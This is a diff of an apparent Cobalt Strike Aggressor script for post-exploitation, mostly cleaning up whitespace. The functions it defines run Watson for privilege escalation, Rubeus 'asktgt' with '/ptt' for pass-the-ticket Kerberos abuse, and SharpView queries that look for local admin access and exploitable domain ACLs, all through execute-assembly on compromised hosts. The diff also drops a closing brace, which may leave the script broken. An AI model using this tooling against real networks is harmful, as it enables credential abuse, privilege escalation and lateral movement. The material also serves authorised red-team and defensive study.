@@ -1375,7 +1375,7 @@ menu "Credentials and Kerberos"
 
 	}
 	
-}
+
 
 
 
@@ -2114,99 +2114,38 @@ bexecute_assembly($1, script_resource('/exe/WindowsFormsApp9.exe'));
 
 
 sub escalateprivs{
-
-
-
-
-
-
-
 bexecute_assembly($1, script_resource('/exe/Watson.exe'));
-
-
-
-
-
-
-
 }
-
-
-
-
-
 ########################## Pass the ticket
-
-
-
 sub passticket{
-
  # beacon ID
-
     $bid = $1;
-
-    
-
  # command arugement variable  
-
-    $cmdargs = "";
-
-  
-
+    $cmdargs = "";  
  # Pop Dialog Box and control flow
-
-    $dialog = dialog("Pass The Ticket", %(execmethod => "Execute-Assembly"), lambda({
-
- 
-
+    $dialog = dialog("Pass The Ticket", %(execmethod => "Execute-Assembly"), lambda({ 
  # manipulate the first argument depending on the executables command line switch statements
-
  # manipulate the second argument depending on the expected input format  
-
         foreach $key => $value ($3){
-
             if ($value ne "" && $value ne "false" && $value ne "true" && $key ne "execmethod"){
-
                 $cmdargs .= ' /';
-
                 $cmdargs .= $key;
-
                 $cmdargs .= ':';
-
                 $cmdargs .= $value.' ';
-
             }
-
  # manipulate the first argument depending on the executables command line switch statements            
-
             else if ($value eq "true"){
-
                 $cmdargs .= ' /';
-
                 $cmdargs .= $key;
-
             }
-
         }
-
  # btask just displays message in beacon window
-
  # execute assembly it is important to notate the use of periods for concatenating the ptt switch      
-
        if ($3["execmethod"] eq "Execute-Assembly"){
-
             btask($bid, 'Executing Pass The Ticket via Execute-Assembly');
-
             bexecute_assembly($bid, script_resource('/exe/Rubeus.exe'), 'asktgt'.$cmdargs.''."/ptt");
-
         }
-
-      
-
     }));
-
-    
-
  # Dialog box contents and text boxes mapped to command line argument keys   
 
     dialog_description($dialog, "**Think with your Tickets, Jimmy!** Use the FQDN for the Domain input!");
@@ -2220,70 +2159,13 @@ sub passticket{
     dbutton_action($dialog, "Run");
 
 	dialog_show($dialog);
-
-
-
 }
-
-
-
-
-
-
-
 ########################## SharpView Find Local Admin Access
-
-
-
-
-
-
-
 sub findlocaladminaccess{
-
-
-
-
-
-
-
 bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-LocalAdminAccess");
-
-
-
-
-
-
-
 }
-
-
-
-
-
 ########################## SharpView Find Interesting Domain ACL
-
-
-
-
-
-
-
 sub findinterestingdomainacl{
-
-
-
-
-
-
-
 bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-InterestingDomainACL");
-
-
-
-
-
-
-
 }
 
